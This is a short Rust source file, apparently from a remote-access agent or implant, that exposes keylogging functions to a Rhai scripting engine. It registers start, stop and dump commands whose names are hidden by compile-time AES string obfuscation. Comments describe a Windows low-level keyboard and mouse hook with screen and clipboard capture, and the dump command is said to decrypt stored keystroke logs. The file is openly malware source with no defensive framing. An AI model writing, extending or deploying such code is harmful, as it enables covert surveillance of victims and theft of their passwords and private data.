// src/agent/scripting/keylogger.rs
use rhai::Engine;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {
    // Windows: installs a low-level keyboard/mouse hook + screen/clipboard capture.
    // Linux / macOS: returns "Not supported".
    engine.register_fn(&aes_str!("internal_keylog_start"), || -> String {
        crate::agent::keylogger::start()
    });

    engine.register_fn(&aes_str!("internal_keylog_stop"), || -> String {
        crate::agent::keylogger::stop()
    });

    // Decrypts and returns all accumulated keylog data from disk + in-memory buffer.
    engine.register_fn(&aes_str!("internal_keylog_dump"), || -> String {
        crate::agent::keylogger::get_logs()
    });
}
